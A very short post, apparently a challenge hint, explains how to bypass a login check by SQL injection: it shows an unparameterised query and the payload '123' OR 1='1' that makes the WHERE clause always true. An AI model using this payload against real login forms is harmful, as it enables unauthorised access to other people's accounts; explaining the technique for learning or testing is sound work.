There is a very simple injection.<br>
The query is:
<pre>
SELECT * FROM table_name WHERE login=$login AND password=$password
</pre>
So just type something in a login input, close a single quote and make True expression.<br>
Something like:
<pre>
123' OR 1='1
</pre>
GL